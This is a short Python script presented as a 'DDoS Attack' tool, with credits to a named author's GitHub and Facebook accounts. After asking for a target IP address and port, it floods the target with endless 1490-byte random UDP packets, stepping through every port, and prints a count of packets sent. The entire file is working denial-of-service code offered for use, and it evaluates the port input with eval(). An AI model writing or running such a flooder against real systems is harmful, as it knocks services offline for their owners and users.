import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("cls")
os.system("figlet DDoS Attack") #If using Linux.
print()
print("Author   : SSL-ACTX")
print("github   : https://github.com/SSL-ACTX")
print("Facebook : https://www.facebook.com/kim.hajin91")
print()
ip = input("IP: ")
port = eval(input("Port: "))

os.system("clear")
os.system("cls")
os.system("figlet Attack Starting...")
print("[             ] 0% ")
time.sleep(1)
print("[===          ] 25%")
time.sleep(1)
print("[======       ] 50%")
time.sleep(1)
print("[=========    ] 75%")
time.sleep(1)
print("[=============] 100%")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

